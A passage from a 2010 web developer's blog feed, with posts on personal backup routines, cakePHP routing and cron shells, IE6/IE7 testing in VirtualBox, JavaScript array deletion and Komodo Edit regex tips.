   <content type="html">&lt;p&gt;My computer was starting to get slower and slower for the past days. And I
realized my automatic backup wasn&amp;#39;t backing anything up for the past month.&lt;/p&gt;

&lt;p&gt;And I realized I had different versions of the same files on my 2 laptops...&lt;/p&gt;

&lt;p&gt;Well, it seems I have to do some cleaning up.&lt;/p&gt;

&lt;h2&gt;Synchronizing paperwork&lt;/h2&gt;

&lt;p&gt;I started by cleaning up my &lt;a href=&quot;http://www.dropbox.com/&quot;&gt;Dropbox &lt;/a&gt;folder. I
removed shared folders with past clients, and created a &amp;quot;Paperwork&amp;quot; folder
where I put all my invoices, contracts and general paperwork.&lt;/p&gt;

&lt;p&gt;I also added my private &lt;a href=&quot;http://keepass.info/&quot;&gt;KeePass &lt;/a&gt;file as well as other
info I may need to access anywhere, anytime.&lt;/p&gt;

&lt;p&gt;KeePass allow me to store all my login/password credentials in a secure way
(protected by a master password). It is really useful to have this file on all
my computers (and mobile phone).&lt;/p&gt;

&lt;p&gt;Dropbox is excellent for storing simple files, that you need everywhere. Being
able to access invoices and contracts even from my mobile phone proved quite
valuable when meeting clients.&lt;/p&gt;

&lt;h2&gt;Hard backup of personal files&lt;/h2&gt;

&lt;p&gt;I&amp;#39;ve also changed my scheduled backups of personal files. I bought an &lt;a href=&quot;http://www.acronis.com/&quot;&gt;Acronis
True Image&lt;/a&gt; last year, and reconfigured it today.&lt;/p&gt;

&lt;p&gt;I have a hard drive whose sole purpose is to save backups. I scheduled for the
first of each month to save : my system state, my applications configuration,
and my personal files (photos, saved gamed, writings, etc).&lt;/p&gt;

&lt;p&gt;I manually started all this backups to have a clean start. I also forced the
backup to restart a whole new file every 6 month (opposed to using the
incremental backup).&lt;/p&gt;

&lt;h2&gt;Backing up my music and movies&lt;/h2&gt;

&lt;p&gt;I did not spent too much time figuring how to save my hundred of Go of music
and movies. I rarely watch the same movies twice, so losing them won&amp;#39;t affect
me too much.&lt;/p&gt;

&lt;p&gt;I occasionally re-watch series, though, but as most of my friends have the
same tastes as I, I could very easily get them back from them, or download
them (again).&lt;/p&gt;

&lt;p&gt;Regarding music, well, I have quite a big collection, but most of it is
already &amp;quot;backed up&amp;quot; on my portable mp3 player.&lt;/p&gt;

&lt;h2&gt;Automatic synchronizing with BitBucket&lt;/h2&gt;

&lt;p&gt;On my day work, I now always version my files using Mercurial.
&lt;a href=&quot;http://bitbucket.org/&quot;&gt;BitBucket&lt;/a&gt; offers unlimited storage, and unlimited
public repositories. Private repo are limited to 5 users. As I&amp;#39;m mostly alone
on projects that should stay private, this seems the best deal I could found.&lt;/p&gt;

&lt;p&gt;Mercurial being a versionning system, I got all the benefits of a backup here,
being able to revert to previous versions, update it whenever I want and
access it from anywhere.&lt;/p&gt;

&lt;p&gt;I wrote a custom Hg hook on commit to automatically push my repos to BitBucket
at least once a day (I&amp;#39;ll post the code in a future post).&lt;/p&gt;

&lt;h2&gt;MySQL Backup&lt;/h2&gt;

&lt;p&gt;I used to backup mysql databases on my work computer using a windows app. This
was slowing down my computer on every boot as well and backup was thus only
effective when I was working and not when I was on vacations.&lt;/p&gt;

&lt;p&gt;Today, I wanted something a lot more flexible, so I set a cronjob on my main
host coupled with a slightly edited &lt;a href=&quot;http://sourceforge.net/projects/automysqlbackup/&quot;&gt;autoMySQLBackup
&lt;/a&gt;script.&lt;/p&gt;

&lt;p&gt;This will automatically run everyday at midnight and make a local save (with
daily, weekly and monthly rotate) of all my clients databases. Logs are saved
on disk and gzipped, and will also be sent to a special backup@pixelastic.com
mail address (stored on GMail).&lt;/p&gt;

&lt;p&gt;This way I am sure to have my mysql backups on two different hosts, with daily
and automatic saves, that I can access from anywhere if anything goes wrong.&lt;/p&gt;

&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;It took me almost two full days to get the right tools, configure them and
write my custom scripts but now, it is seamlessly integrated with my daily
workflow. This is a weight off my shoulders, I know I can safely work as usual
and my files are saved and easily accessible.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Using Router::connectNamed without breaking pagination</title>
   <link href="http://blog.pixelastic.com/2010/12/02/router-connectnamed-breaking-pagination/"/>
   <updated>2010-12-02T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/12/02/router-connectnamed-breaking-pagination</id>
   <content type="html">&lt;p&gt;In cakePHP, you can pass all sort of parameters to your urls by following the
&lt;code&gt;www.domain.com/controllers/view/foo:bar/foo2:baz&lt;/code&gt; syntax.&lt;/p&gt;

&lt;p&gt;You could then access &lt;code&gt;$this-&amp;gt;params[&amp;#39;foo&amp;#39;]&lt;/code&gt; and &lt;code&gt;$this-&amp;gt;params[&amp;#39;foo2&amp;#39;]&lt;/code&gt; in
your &lt;code&gt;Controller::view()&lt;/code&gt; method.&lt;/p&gt;

&lt;h2&gt;Using Router::connectName()&lt;/h2&gt;

&lt;p&gt;This does not play nice with default routing. I mean, if you define a route to
add a vanity url like &lt;code&gt;www.domain.com/vanity&lt;/code&gt; is routed to
&lt;code&gt;Controller:view()&lt;/code&gt;, you&amp;#39;ll write something like this :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;Router::connect(&amp;#39;/vanity&amp;#39;, array(&amp;#39;controller&amp;#39; =&amp;gt; &amp;#39;controllers&amp;#39;, &amp;#39;action&amp;#39; =&amp;gt; &amp;#39;view&amp;#39;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will work as long as you don&amp;#39;t specify any additional parameters. Once
you started to add any parameters, the Router won&amp;#39;t be able to parse your url
and instead of returning &lt;code&gt;www.domain.com/vanity/foo:bar/foo2:baz&lt;/code&gt; it will
return the default &lt;code&gt;www.domain.com/controllers/view/foo:bar/foo2:baz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If you do want your custom parameters to be taken into account by your
&lt;code&gt;Router&lt;/code&gt; rules, you have to manually add them, using&lt;code&gt;
Router::connectNamed(array(&amp;#39;foo&amp;#39;, &amp;#39;foo2&amp;#39;))&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;Custom connectNamed()&lt;/h2&gt;

&lt;p&gt;I&amp;#39;ll let you browse the [connectNamed()](http://api.cakephp.org/class/router&lt;/p&gt;

&lt;h1&gt;method-RouterconnectNamed) documentation page for further details on how to&lt;/h1&gt;

&lt;p&gt;use it properly. But one important thing not to overlook is that if you ever
have to define a custom &lt;code&gt;Router::connectNamed()&lt;/code&gt;, do not forget to add a
second parameter of &lt;code&gt;array(&amp;#39;default&amp;#39; =&amp;gt; true)&lt;/code&gt;, this will allow all your
paginated links to keep working.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>The dreaded <noscript> on IE7</title>
   <link href="http://blog.pixelastic.com/2010/11/26/dreaded-noscript-ie7/"/>
   <updated>2010-11-26T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/11/26/dreaded-noscript-ie7</id>
   <content type="html">&lt;p&gt;This &lt;code&gt;&amp;lt;noscript&amp;gt;&lt;/code&gt; tag on IE7 is making me crazy. Here are some &amp;quot;interesting&amp;quot;
facts about it :&lt;/p&gt;

&lt;h2&gt;No content through Javascript&lt;/h2&gt;

&lt;p&gt;You can&amp;#39;t get its content though javascript. It can be targeted but neither
&lt;code&gt;.innerHTML&lt;/code&gt; nor &lt;code&gt;.textContent&lt;/code&gt; is set. It does not have any &lt;code&gt;.childNodes&lt;/code&gt;
either.&lt;/p&gt;

&lt;h2&gt;Gets displayed even when scripts are enabled&lt;/h2&gt;

&lt;p&gt;If you set &lt;code&gt;noscript { display:block; border:15px solid red;},&lt;/code&gt; it will get
displayed even if Javascript is enabled. But with no content inside, you&amp;#39;ll
only have borders and background...&lt;/p&gt;

&lt;h2&gt;Styling it anyway&lt;/h2&gt;

&lt;p&gt;If you want to style it, just add an inner element and style this one :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;noscript&amp;gt;&amp;lt;p&amp;gt;&lt;/span&gt;Lorem ipsum&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;/noscript&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nt&quot;&gt;noscript&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;blue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Disabling Javascript on IE7&lt;/h2&gt;

&lt;p&gt;If you want to disable Javascript on IE7, you&amp;#39;ll have to go to Tools &amp;gt;
Internet Options &amp;gt; Security &amp;gt; Custom and setting the &amp;quot;Enable ASP scripts&amp;quot; to
No.&lt;/p&gt;

&lt;p&gt;Yes, this doesn&amp;#39;t make any sense.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Deleting an element from an Array/Object in Javascript</title>
   <link href="http://blog.pixelastic.com/2010/11/25/deleting-element-array-object-javascript/"/>
   <updated>2010-11-25T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/11/25/deleting-element-array-object-javascript</id>
   <content type="html">&lt;p&gt;I&amp;#39;m going to post that here because it&amp;#39;s the second time I stumble upon this
&amp;quot;problem&amp;quot; and the second time I lost some precious time to understand what was
going on.&lt;/p&gt;

&lt;p&gt;I had a Javascript Array, named &lt;code&gt;elements&lt;/code&gt;and I wanted to remove one of its
properties by its index &lt;code&gt;i&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I know that merely calling &lt;code&gt;elements[i] = null&lt;/code&gt; won&amp;#39;t work (the property will
still be present in the array and the length won&amp;#39;t be updated.&lt;/p&gt;

&lt;p&gt;Calling &lt;code&gt;delete elements[i]&lt;/code&gt; won&amp;#39;t work either. Same result.&lt;/p&gt;

&lt;p&gt;I had to use &lt;code&gt;elements.splice(i, 1)&lt;/code&gt; to effectively remove the element and
update the length value.&lt;/p&gt;

&lt;p&gt;Also note that sometimes I accidentally declare an Array when what I really
want is an Object. I tend to forgot that associative &lt;code&gt;Arrays&lt;/code&gt;in Javascript do
not really exists, they just are &lt;code&gt;Objects&lt;/code&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Komodo Edit Tip : Using regexp in search/replace</title>
   <link href="http://blog.pixelastic.com/2010/11/24/komodo-edit-tip-regexp-search-replace/"/>
   <updated>2010-11-24T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/11/24/komodo-edit-tip-regexp-search-replace</id>
   <content type="html">&lt;p&gt;Here&amp;#39;s a little tip. As I started to use more and more often the regexp search
and replace feature of Komodo Edit, I guessa quick blog note could be useful.&lt;/p&gt;

&lt;p&gt;I had to &amp;quot;simplify&amp;quot; a big HTML file a while ago, and searching for useless
tags and then replacing them using this feature saved me a lot of time.&lt;/p&gt;

&lt;p&gt;Note that you can use &lt;code&gt;\n&lt;/code&gt; and &lt;code&gt;\t&lt;/code&gt; for new line and tabulation respectively.&lt;/p&gt;

&lt;p&gt;I also had to change the order of attributes in all &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tags (according to
Google Page Speed, this is supposed to help the Gzip algorithm in compressing
data).&lt;/p&gt;

&lt;p&gt;I just had to search for&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;(.*)&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;(.*)&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;(.*)&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;(.*)&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;and replace with&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;\1&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;\4&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;\3&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;\2&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Testing IE6 and IE7 using VirtualBox on Windows</title>
   <link href="http://blog.pixelastic.com/2010/11/23/testing-ie6-ie7-virtualbox-windows/"/>
   <updated>2010-11-23T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/11/23/testing-ie6-ie7-virtualbox-windows</id>
   <content type="html">&lt;p&gt;Testing various IE version as always been a chore. Back in the days, I managed
to install both IE7 and use a standalone IE6 version.&lt;/p&gt;

&lt;p&gt;Then, I discovered &lt;a href=&quot;http://www.my-%0Adebugbar.com/wiki/IETester/HomePage&quot;&gt;IETester&lt;/a&gt; that became a lifesaver (my IE6
standalone tends to crash a little too often). It would allow me to test
various IE versions side by side.&lt;/p&gt;

&lt;p&gt;Unfortunatly, the emulation wasn&amp;#39;t perfect, some ajax calls were returning
errors and the Flash support wasn&amp;#39;t so good.&lt;/p&gt;

&lt;p&gt;Additionnaly, there was not way to use the
&lt;a href=&quot;http://www.debugbar.com/?langage=en&quot;&gt;IEDebugBar&lt;/a&gt; nor the WebPageTest plugin.&lt;/p&gt;

&lt;h2&gt;Switching to VM&lt;/h2&gt;

&lt;p&gt;I finally decided to switch to a Virtual Machine. This would allow me to have
an exact snapshot of a given OS/IE version.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.virtualbox.org/&quot;&gt;VirtualBox&lt;/a&gt; is free, so this was my choice.
Microsft used to provide &lt;a href=&quot;htt%0Ap://www.microsoft.com/downloads/en/details.aspx?FamilyId=21EABB90-958F-%0A4B64-B5F1-73D0A413C8EF&amp;amp;displaylang=en&quot;&gt;free downloads of various flavors of Windows/IE&lt;/a&gt;, but it seems to be only working with
their proprietary VirtualPC (which only works under Windows 7).&lt;/p&gt;

&lt;p&gt;So I took the long road, and manually installed a Windows XP Pro through
VirtualBox, using my Windows XP cd.&lt;/p&gt;

&lt;p&gt;I used the same serial than my main windows XP. I&amp;#39;m not exactly sure if
legally, I&amp;#39;m allowed to do that. How does a VM fits inside the legal
statements ? Am I allowed to use one windows activation key inside itself ?
Well, I don&amp;#39;t really know and don&amp;#39;t care that much.&lt;/p&gt;

&lt;h2&gt;Starting with some housekeeping&lt;/h2&gt;

&lt;p&gt;I ended up with a nice and clean WinXP install. I had to add an antivirus
quick if I wanted to keep it clean. VirtualBox provides a Shared Folder
feature to exchange files between the host and the guest.&lt;/p&gt;

&lt;p&gt;Start by adding shared folders to your guest (Devices &amp;gt; Shared Folders).&lt;/p&gt;

&lt;p&gt;Then install the &amp;quot;Guest Additions&amp;quot;, &lt;del&gt;just mount the
&lt;code&gt;VBoxGuestAdditions.iso&lt;/code&gt; found in your VirtualBox installation directory,
using DaemonTools and run the installer.&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;Don&amp;#39;t be as silly as I was. Do not install the Guest Additions on your host,
but on your guest. Yeah, seems more logical that way. Just select the options
in the Devices menu of your guest window. Reboot after the installation.&lt;/p&gt;

&lt;p&gt;You should now be able to access your shared folders by opening the windows
Explorer (Windows + E), and going to Network places &amp;gt; All network &amp;gt; VirtualBox
Shared Folders&lt;/p&gt;

&lt;h2&gt;Accessing your websites&lt;/h2&gt;

&lt;p&gt;I then updated the &lt;code&gt;C:\WINDOWS\system32\drivers\etc\hosts&lt;/code&gt; file to bind all
requests made to my still-in-development websites to my host.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ini&quot; data-lang=&quot;ini&quot;&gt;&lt;span class=&quot;err&quot;&gt;10.0.2.2Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;www.pixelastic&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;10.0.2.2Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;s1.pixelastic&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;10.0.2.2Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;s2.pixelastic&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;10.0.2.2Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;s3.pixelastic&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You can find your host ip by doing a &lt;code&gt;ipconfig /all&lt;/code&gt; in a command prompt.&lt;/p&gt;

&lt;p&gt;You then just have to go to http://www.pixelastic/ in IE6 to display the
correct website. You can even switch to the Seamless mode to display your IE6
inside your main host.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Running a cakePHP shell script as cronjob on Dreamhost</title>
   <link href="http://blog.pixelastic.com/2010/11/22/running-cakephp-shell-script-cronjob-dreamhost/"/>
   <updated>2010-11-22T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/11/22/running-cakephp-shell-script-cronjob-dreamhost</id>
   <content type="html">&lt;p&gt;Dreamhost as &lt;a href=&quot;http://wiki.dreamhost.com/Crontab&quot;&gt;a wonderful wiki&lt;/a&gt; on how to
set cron jobs and cakePHP has &lt;a href=&quot;http://book.cakephp.org/view/846/Running-Shells-as-cronjobs&quot;&gt;a cookbook page on how to do
it&lt;/a&gt; too, but
getting it just right was a little frustrating.&lt;/p&gt;

&lt;p&gt;I finally managed to run my shell task as a cronjob, and here is how I did it.&lt;/p&gt;

&lt;h2&gt;The magic command&lt;/h2&gt;

&lt;p&gt;First, here is the command I wrote in my Dreamhost panel :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;/home/username/domain.com/cake/console/cake -app /home/username/domain.com/app/ shell_name
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You have to set the full path to the cake console because it obviously is not
in the pre-saved paths on a default Dreamhost install.&lt;/p&gt;

&lt;p&gt;You also have to specify the &lt;code&gt;app&lt;/code&gt; directory otherwise cake will search your
shell in the wrong directories. This is even more important if your shell is
located in a plugin directory.&lt;/p&gt;

&lt;p&gt;But, this won&amp;#39;t work as-is, you&amp;#39;ll have to do several other stuff, mostly
explained by &lt;a href=&quot;http://www.milesj.me/blog/read/83/Setting-Up-%0ACron-Jobs-With-Cake-Shells&quot;&gt;Miles Johnson&lt;/a&gt;, but I&amp;#39;ll recap them&lt;/p&gt;

&lt;h2&gt;Setting the file as executable&lt;/h2&gt;

&lt;p&gt;You have to set the &lt;code&gt;cake/console/cake&lt;/code&gt; file as executable. It is kind of
obvious, but you have to do it anyway.&lt;/p&gt;

&lt;h2&gt;Set the TERM variable&lt;/h2&gt;

&lt;p&gt;Update you &lt;code&gt;cake/console/cake&lt;/code&gt; to replace the first lines with :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;LIB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;/%cake/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;APP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;pwd&amp;#39;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;linux
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;TERM
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you don&amp;#39;t, you&amp;#39;ll have notice errors in the resulting log. No big deal, but
it is cleaner that way.&lt;/p&gt;

&lt;h2&gt;Forcing using php5&lt;/h2&gt;

&lt;p&gt;While in command line, the php command refer to the php4 version. If you need
to use php5 (and I guess you should), you would have to manually reference the
binary file. Hence, you have to update your &lt;code&gt;cake/console/cake&lt;/code&gt; file one more
time and change the &lt;code&gt;exec&lt;/code&gt;line to :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; /usr/local/php5/bin/php -q &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;LIB&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;cake.php -working &lt;span class=&quot;s2&quot;&gt;&amp;quot;${APP}&amp;quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;$@&amp;quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;And it&amp;#39;s ok&lt;/h2&gt;

&lt;p&gt;Your cronjob should not work effortlessly. It took me some long hours to track
all this down (along with other issues on my local dev machine that make
debugging even more cloudy).&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Knowing dev from prod in a cakePHP shell</title>
   <link href="http://blog.pixelastic.com/2010/11/22/knowing-dev-prod-cakephp-shell/"/>
   <updated>2010-11-22T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/11/22/knowing-dev-prod-cakephp-shell</id>
   <content type="html">&lt;p&gt;I wrote a cakePHP shell to synchronize an IMAP mailbox with a mysql table. I
wanted to test my shell on local first, then upload it and make a CRON job of
it.&lt;/p&gt;

&lt;p&gt;Whenever I tried to run the shell from my development environment I was
greeted with various &amp;quot;&lt;em&gt;Database table is missing&lt;/em&gt;&amp;quot; messages.&lt;/p&gt;

&lt;p&gt;After some digging, it occurs that the shell was connecting to my prod
database, not the dev one.&lt;/p&gt;

&lt;h2&gt;The culprit&lt;/h2&gt;

&lt;p&gt;I wrote a little snippet to automatically switch to the correct database based
on the current server name. If it was &lt;code&gt;localhost&lt;/code&gt;, I used the &lt;code&gt;$dev&lt;/code&gt;
credentials, while keeping the &lt;code&gt;$default&lt;/code&gt; credentials for other cases (ie.
production).&lt;/p&gt;

&lt;p&gt;This worked great and I added this little code to my &lt;code&gt;database.php&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;But when running a shell, the &lt;code&gt;env(&amp;#39;SERVER_ADDR&amp;#39;)&lt;/code&gt; was empty, thus my test was
always selecting the prod database.&lt;/p&gt;

&lt;p&gt;I couldn&amp;#39;t find anyway to guess if I was running a shell from prod or dev. I
sure had access to a lot of config informations through &lt;code&gt;env&lt;/code&gt; and &lt;code&gt;$_SERVER&lt;/code&gt;
but none seemed to be enough to guess the correct environment.&lt;/p&gt;

&lt;h2&gt;Solution&lt;/h2&gt;

&lt;p&gt;I finally decided that the only way was to manually pass a flag to my shell
call to tell if it was to use the dev or prod credentials.&lt;/p&gt;

&lt;p&gt;I decided that adding a &lt;code&gt;dev&lt;/code&gt; arg to the shell call will switch to dev mode,
while not adding it will use production mode.&lt;/p&gt;

&lt;p&gt;My final shell call looked like :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;cake -app &lt;span class=&quot;s2&quot;&gt;&amp;quot;path/to/app&amp;quot;&lt;/span&gt; mail_import dev
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And I added the following logic in my database switching logic :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;// Defining the Environment (prod or dev)&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;if (defined(&amp;#39;CAKEPHP_SHELL&amp;#39;)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Based on the prod/dev flag&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $args = env(&amp;#39;argv&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $environment = &amp;#39;prod&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  foreach($args as $flag) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    if ($flag==&amp;#39;dev&amp;#39;) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      $environment = &amp;#39;dev&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      break;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;} else {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Based on the server url&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $environment = (env(&amp;#39;SERVER_ADDR&amp;#39;)==&amp;#39;127.0.0.1&amp;#39;) ? &amp;#39;dev&amp;#39; : &amp;#39;prod&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note that I checked if the script was accessed through normal server/php
delegation or through the CLI usingÂ &lt;code&gt;defined(&amp;#39;CAKEPHP_SHELL&amp;#39;)&lt;/code&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Adding extensions to a Windows PHP</title>
   <link href="http://blog.pixelastic.com/2010/11/22/adding-extensions-windows-php/"/>
   <updated>2010-11-22T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/11/22/adding-extensions-windows-php</id>
   <content type="html">&lt;p&gt;My development environment is set up thanks to EasyPHP. I&amp;#39;ve used this app
since the first days that I started to write PHP and it followed me since.&lt;/p&gt;

&lt;p&gt;I guess I have a better understanding of what it does under the scenes now and
could probably work with a clean and custom Apache/MySQL/PHP install. But I
like simplicity.&lt;/p&gt;

&lt;p&gt;Anyway, I just wanted to run my imap script from the CLI but ran into &amp;quot;&lt;em&gt;Fatal
error : imap&lt;/em&gt;open not defined_&amp;quot;.&lt;/p&gt;

&lt;p&gt;The same script was perfectly working when accessing it from my browser but
failed when launched from the CLI.&lt;/p&gt;

&lt;p&gt;That when I remember that I needed to enabled the &lt;code&gt;php_imap.dll&lt;/code&gt; extensions in
both EasyPHP PHP options (for web access) and &lt;code&gt;C:\windows\php.ini&lt;/code&gt; (for cli
access)&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Migrating mails from GMail to other IMAP server</title>
   <link href="http://blog.pixelastic.com/2010/11/16/migrating-mails-gmail-imap-server/"/>
   <updated>2010-11-16T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/11/16/migrating-mails-gmail-imap-server</id>
   <content type="html">&lt;p&gt;I have previously blogged on how &lt;a href=&quot;/blog/176:migrating-mails-%0Aimap-part-1-2&quot;&gt;I migrate mails&lt;/a&gt; from &lt;a href=&quot;/blog/180:migrating-mails-%0Afrom-imap-to-imap-part-2-2&quot;&gt;one IMAP server to another.&lt;/a&gt; Today I had to migrate some mails again.&lt;/p&gt;

&lt;p&gt;My client&amp;#39;s staff wasn&amp;#39;t happy about the GMail webmail we gave them. The lack
of a true &amp;quot;Draft&amp;quot; feature (one tha could be used and reused) had them drop a
lot of productivity, so we decided to get back to Squirel Mail.&lt;/p&gt;

&lt;p&gt;I started by manually recreating all the email adresses on the back-end on the
